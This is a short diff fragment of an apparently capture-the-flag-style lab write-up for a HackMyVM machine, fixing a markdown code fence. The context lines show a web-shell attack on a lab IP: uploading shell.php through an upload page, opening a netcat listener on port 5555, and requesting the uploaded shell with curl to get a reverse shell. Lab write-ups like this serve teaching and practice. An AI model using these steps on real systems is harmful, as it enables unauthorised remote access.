@@ -170,7 +170,7 @@ Upload shell.php to http://10.1.1.45/t0d0_l1st_f0r_f1r5t/upload.php
 └─$ nc -nlvp 5555                                                                                                                                                                                                                        1 ⨯
 listening on [any] 5555 ...
 ```
-``bash
+```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/First]
 └─$ curl $url/t0d0_l1st_f0r_f1r5t/uploads/shell.php
 ```
